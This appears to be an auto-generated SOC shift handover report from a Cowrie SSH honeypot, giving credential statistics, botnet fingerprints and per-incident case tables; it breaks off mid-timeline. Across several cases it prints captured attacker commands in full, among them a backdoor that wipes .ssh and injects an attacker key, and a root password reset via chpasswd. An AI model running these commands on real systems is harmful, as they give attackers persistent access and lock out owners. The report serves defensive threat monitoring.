# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-21 |
| **Generated At** | 2026-05-21T19:58:57Z |
| **Shift Time** | 19:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **270** |
| Confirmed Threats | **112** |
| False Positives Filtered | **158** (58.5%) |
| Unique Attacker IPs | **51** |
| Countries of Origin | **22** |
| High Severity Cases | **30** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **240** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **85** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **22** |
| Unique Passwords | **28** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `345gs5662d34` | 15 |
| `demo` | 5 |
| `admin` | 5 |
| `evgeny` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 18 |
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 14 |
| `admin` | 2 |
| `password` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 14 |
| `demo` | `123456` | 5 |
| `evgeny` | `123456` | 3 |
| `kirill` | `123456` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `0909` | `212.118.52.213` | 2026-05-21T18:02:07 |
| `root` | `5tgb6yhn` | `12.156.67.18` | 2026-05-21T18:03:22 |
| `root` | `3245gs5662d34` | `12.156.67.18` | 2026-05-21T18:03:28 |
| `root` | `admin` | `45.15.225.137` | 2026-05-21T18:03:36 |
| `root` | `iloveyou` | `101.36.122.139` | 2026-05-21T18:21:36 |
| `root` | `3245gs5662d34` | `101.36.122.139` | 2026-05-21T18:21:39 |
| `root` | `minsheng` | `103.211.59.6` | 2026-05-21T18:38:19 |
| `root` | `3245gs5662d34` | `103.211.59.6` | 2026-05-21T18:38:21 |
| `root` | `zoho` | `46.8.78.131` | 2026-05-21T18:40:39 |
| `root` | `3245gs5662d34` | `46.8.78.131` | 2026-05-21T18:40:52 |
| `root` | `qq888888` | `101.36.122.139` | 2026-05-21T18:40:59 |
| `root` | `iloveyou` | `103.211.59.6` | 2026-05-21T18:44:46 |
| `root` | `0807` | `103.211.59.6` | 2026-05-21T18:51:21 |
| `root` | `168168` | `101.36.122.139` | 2026-05-21T18:52:21 |
| `root` | `0807` | `101.36.122.139` | 2026-05-21T19:03:50 |
| `root` | `Password123!` | `182.180.59.208` | 2026-05-21T19:06:44 |
| `root` | `3245gs5662d34` | `182.180.59.208` | 2026-05-21T19:06:47 |
| `root` | `aa001` | `101.36.122.139` | 2026-05-21T19:22:49 |
| `root` | `minsheng` | `101.36.122.139` | 2026-05-21T19:26:50 |
| `root` | `aa001` | `103.211.59.6` | 2026-05-21T19:30:26 |
| `root` | `168168` | `103.211.59.6` | 2026-05-21T19:56:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **270** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 87 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 57 | 12 |
| `03a80b21afa8...` | Modern SSH client | 27 | 2 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |
| `19532158b559...` | Mirai/variant | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 57 | 12 | Mirai/variant |
| `03a80b21afa8...` | libssh | 27 | 2 | Modern SSH client |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:aVYVU2civuZv"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `212.118.52.213`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `46.8.78.131`, `182.180.59.208`, `101.36.122.139`, `103.211.59.6`, `12.156.67.18`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **51** |
| Unique ASNs | **38** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 5 | HIGH |
| `AS134601` | Microlink Technology | 4 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | LOW |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS204566` | Web Lite S.A.L | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS34984` | Superonline Iletisim Hizmetleri A.S. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (30)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7d9d92083c7f

| Field | Detail |
|---|---|
| **Source IP** | `212.118.52[.]213` |
| **First Seen** | 2026-05-21 18:02 |
| **Last Seen** | 2026-05-21 18:02 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:aVYVU2civuZv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:02:06` | `cowrie.session.connect` |
| `2026-05-21 18:02:06` | `cowrie.client.version` |
| `2026-05-21 18:02:06` | `cowrie.client.kex` |
| `2026-05-21 18:02:07` | `cowrie.login.success` |
| `2026-05-21 18:02:07` | `cowrie.session.params` |
| `2026-05-21 18:02:07` | `cowrie.command.input` |
| `2026-05-21 18:02:07` | `cowrie.command.failed` |
| `2026-05-21 18:02:08` | `cowrie.log.closed` |
| `2026-05-21 18:02:08` | `cowrie.session.params` |
| `2026-05-21 18:02:08` | `cowrie.command.input` |
| `2026-05-21 18:02:08` | `cowrie.session.file_download` |
| `2026-05-21 18:02:08` | `cowrie.log.closed` |
| `2026-05-21 18:02:24` | `cowrie.session.params` |
| `2026-05-21 18:02:24` | `cowrie.command.input` |
| `2026-05-21 18:02:25` | `cowrie.log.closed` |
| `2026-05-21 18:02:25` | `cowrie.session.params` |
| `2026-05-21 18:02:25` | `cowrie.command.input` |
| `2026-05-21 18:02:25` | `cowrie.log.closed` |
| `2026-05-21 18:02:25` | `cowrie.session.params` |
| `2026-05-21 18:02:25` | `cowrie.command.input` |
| `2026-05-21 18:02:25` | `cowrie.session.file_download` |
| `2026-05-21 18:02:25` | `cowrie.log.closed` |
| `2026-05-21 18:02:26` | `cowrie.session.params` |
| `2026-05-21 18:02:26` | `cowrie.command.input` |
| `2026-05-21 18:02:26` | `cowrie.log.closed` |
| `2026-05-21 18:02:26` | `cowrie.session.params` |
| `2026-05-21 18:02:26` | `cowrie.command.input` |
| `2026-05-21 18:02:27` | `cowrie.log.closed` |
| `2026-05-21 18:02:27` | `cowrie.session.params` |
| `2026-05-21 18:02:27` | `cowrie.command.input` |
| `2026-05-21 18:02:27` | `cowrie.command.input` |
| `2026-05-21 18:02:27` | `cowrie.log.closed` |
| `2026-05-21 18:02:27` | `cowrie.session.params` |
| `2026-05-21 18:02:27` | `cowrie.command.input` |
| `2026-05-21 18:02:28` | `cowrie.log.closed` |
| `2026-05-21 18:02:28` | `cowrie.session.params` |
| `2026-05-21 18:02:28` | `cowrie.command.input` |
| `2026-05-21 18:02:28` | `cowrie.log.closed` |
| `2026-05-21 18:02:28` | `cowrie.session.params` |
| `2026-05-21 18:02:28` | `cowrie.command.input` |
| `2026-05-21 18:02:29` | `cowrie.log.closed` |
| `2026-05-21 18:02:29` | `cowrie.session.params` |
| `2026-05-21 18:02:29` | `cowrie.command.input` |
| `2026-05-21 18:02:29` | `cowrie.log.closed` |
| `2026-05-21 18:02:30` | `cowrie.session.params` |
| `2026-05-21 18:02:30` | `cowrie.command.input` |
| `2026-05-21 18:02:30` | `cowrie.log.closed` |
| `2026-05-21 18:02:30` | `cowrie.session.params` |
| `2026-05-21 18:02:30` | `cowrie.command.input` |
| `2026-05-21 18:02:30` | `cowrie.log.closed` |
| `2026-05-21 18:02:31` | `cowrie.session.params` |
| `2026-05-21 18:02:31` | `cowrie.command.input` |
| `2026-05-21 18:02:31` | `cowrie.log.closed` |
| `2026-05-21 18:02:31` | `cowrie.session.params` |
| `2026-05-21 18:02:31` | `cowrie.command.input` |
| `2026-05-21 18:02:31` | `cowrie.log.closed` |
| `2026-05-21 18:02:32` | `cowrie.session.params` |
| `2026-05-21 18:02:32` | `cowrie.command.input` |
| `2026-05-21 18:02:32` | `cowrie.log.closed` |
| `2026-05-21 18:02:32` | `cowrie.session.params` |
| `2026-05-21 18:02:32` | `cowrie.command.input` |
| `2026-05-21 18:02:32` | `cowrie.log.closed` |
| `2026-05-21 18:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.118.52[.]213` to AbuseIPDB if not already reported
- [ ] Block `212.118.52[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-506f28336369

| Field | Detail |
|---|---|
| **Source IP** | `12.156.67[.]18` |
| **First Seen** | 2026-05-21 18:03 |
| **Last Seen** | 2026-05-21 18:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:03:21` | `cowrie.session.connect` |
| `2026-05-21 18:03:21` | `cowrie.client.version` |
| `2026-05-21 18:03:21` | `cowrie.client.kex` |
| `2026-05-21 18:03:22` | `cowrie.login.success` |
| `2026-05-21 18:03:23` | `cowrie.session.params` |
| `2026-05-21 18:03:23` | `cowrie.command.input` |
| `2026-05-21 18:03:23` | `cowrie.command.failed` |
| `2026-05-21 18:03:23` | `cowrie.log.closed` |
| `2026-05-21 18:03:23` | `cowrie.session.params` |
| `2026-05-21 18:03:23` | `cowrie.command.input` |
| `2026-05-21 18:03:24` | `cowrie.session.file_download` |
| `2026-05-21 18:03:24` | `cowrie.log.closed` |
| `2026-05-21 18:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `12.156.67[.]18` to AbuseIPDB if not already reported
- [ ] Block `12.156.67[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e115a04772da

| Field | Detail |
|---|---|
| **Source IP** | `12.156.67[.]18` |
| **First Seen** | 2026-05-21 18:03 |
| **Last Seen** | 2026-05-21 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:03:27` | `cowrie.session.connect` |
| `2026-05-21 18:03:27` | `cowrie.client.version` |
| `2026-05-21 18:03:27` | `cowrie.client.kex` |
| `2026-05-21 18:03:28` | `cowrie.login.success` |
| `2026-05-21 18:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `12.156.67[.]18` to AbuseIPDB if not already reported
- [ ] Block `12.156.67[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee68478ffbd0

| Field | Detail |
|---|---|
| **Source IP** | `45.15.225[.]137` |
| **First Seen** | 2026-05-21 18:03 |
| **Last Seen** | 2026-05-21 18:05 |
| **Session Duration** | 87s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:03:33` | `cowrie.session.connect` |
| `2026-05-21 18:03:33` | `cowrie.client.version` |
| `2026-05-21 18:03:33` | `cowrie.client.kex` |
| `2026-05-21 18:03:35` | `cowrie.login.failed` |
| `2026-05-21 18:03:36` | `cowrie.login.success` |
| `2026-05-21 18:03:37` | `cowrie.session.params` |
| `2026-05-21 18:03:37` | `cowrie.command.input` |
| `2026-05-21 18:03:37` | `cowrie.command.failed` |
| `2026-05-21 18:03:37` | `cowrie.log.closed` |
| `2026-05-21 18:03:37` | `cowrie.session.params` |
| `2026-05-21 18:03:37` | `cowrie.command.input` |
| `2026-05-21 18:03:38` | `cowrie.log.closed` |
| `2026-05-21 18:03:38` | `cowrie.session.params` |
| `2026-05-21 18:03:38` | `cowrie.command.input` |
| `2026-05-21 18:03:38` | `cowrie.log.closed` |
| `2026-05-21 18:03:39` | `cowrie.session.params` |
| `2026-05-21 18:03:39` | `cowrie.command.input` |
| `2026-05-21 18:03:39` | `cowrie.log.closed` |
| `2026-05-21 18:03:39` | `cowrie.session.params` |
| `2026-05-21 18:03:39` | `cowrie.command.input` |
| `2026-05-21 18:03:40` | `cowrie.log.closed` |
| `2026-05-21 18:03:40` | `cowrie.session.params` |
| `2026-05-21 18:03:40` | `cowrie.command.input` |
| `2026-05-21 18:03:40` | `cowrie.log.closed` |
| `2026-05-21 18:03:41` | `cowrie.session.params` |
| `2026-05-21 18:03:41` | `cowrie.command.input` |
| `2026-05-21 18:03:41` | `cowrie.log.closed` |
| `2026-05-21 18:03:42` | `cowrie.session.params` |
| `2026-05-21 18:03:42` | `cowrie.command.input` |
| `2026-05-21 18:03:42` | `cowrie.log.closed` |
| `2026-05-21 18:03:42` | `cowrie.session.params` |
| `2026-05-21 18:03:42` | `cowrie.command.input` |
| `2026-05-21 18:03:42` | `cowrie.log.closed` |
| `2026-05-21 18:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.15.225[.]137` to AbuseIPDB if not already reported
- [ ] Block `45.15.225[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88036051c16a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 18:21 |
| **Last Seen** | 2026-05-21 18:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:21:36` | `cowrie.session.connect` |
| `2026-05-21 18:21:36` | `cowrie.client.version` |
| `2026-05-21 18:21:36` | `cowrie.client.kex` |
| `2026-05-21 18:21:36` | `cowrie.login.success` |
| `2026-05-21 18:21:36` | `cowrie.session.params` |
| `2026-05-21 18:21:36` | `cowrie.command.input` |
| `2026-05-21 18:21:36` | `cowrie.command.failed` |
| `2026-05-21 18:21:37` | `cowrie.log.closed` |
| `2026-05-21 18:21:37` | `cowrie.session.params` |
| `2026-05-21 18:21:37` | `cowrie.command.input` |
| `2026-05-21 18:21:37` | `cowrie.session.file_download` |
| `2026-05-21 18:21:37` | `cowrie.log.closed` |
| `2026-05-21 18:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58512b9d306c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-21 18:21 |
| **Last Seen** | 2026-05-21 18:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:21:39` | `cowrie.session.connect` |
| `2026-05-21 18:21:39` | `cowrie.client.version` |
| `2026-05-21 18:21:39` | `cowrie.client.kex` |
| `2026-05-21 18:21:39` | `cowrie.login.success` |
| `2026-05-21 18:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-088701e6e058

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 18:38 |
| **Last Seen** | 2026-05-21 18:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:38:19` | `cowrie.session.connect` |
| `2026-05-21 18:38:19` | `cowrie.client.version` |
| `2026-05-21 18:38:19` | `cowrie.client.kex` |
| `2026-05-21 18:38:19` | `cowrie.login.success` |
| `2026-05-21 18:38:19` | `cowrie.session.params` |
| `2026-05-21 18:38:19` | `cowrie.command.input` |
| `2026-05-21 18:38:19` | `cowrie.command.failed` |
| `2026-05-21 18:38:19` | `cowrie.log.closed` |
| `2026-05-21 18:38:19` | `cowrie.session.params` |
| `2026-05-21 18:38:19` | `cowrie.command.input` |
| `2026-05-21 18:38:19` | `cowrie.session.file_download` |
| `2026-05-21 18:38:19` | `cowrie.log.closed` |
| `2026-05-21 18:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-294589032e65

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 18:38 |
| **Last Seen** | 2026-05-21 18:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:38:21` | `cowrie.session.connect` |
| `2026-05-21 18:38:21` | `cowrie.client.version` |
| `2026-05-21 18:38:21` | `cowrie.client.kex` |
| `2026-05-21 18:38:21` | `cowrie.login.success` |
| `2026-05-21 18:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d4a5802f61b

| Field | Detail |
|---|---|
| **Source IP** | `46.8.78[.]131` |
| **First Seen** | 2026-05-21 18:40 |
| **Last Seen** | 2026-05-21 18:40 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 18:40:36` | `cowrie.session.connect` |
| `2026-05-21 18:40:36` | `cowrie.client.version` |
| `2026-05-21 18:40:37` | `cowrie.client.kex` |
| `2026-05-21 18:40:39` | `cowrie.login.success` |
| `2026-05-21 18:40:39` | `cowrie.session.params` |
| `2026-05-21 18:40:39` | `cowrie.command.input` |
| `2026-05-21 18:40:39` | `cowrie.command.failed` |
| `2026-05-21 18:40:41` | `cowrie.log.closed` |
| `2026-05-21 18:40:42` | `cowrie.session.params` |
| `2026-05-21 18:40:42` | `cowrie.command.input` |
| `2026-05-21 18:40:42` | `cowrie.session.file_download` |
| `2026-05-21 18:40:42` | `cowrie.log.closed` |
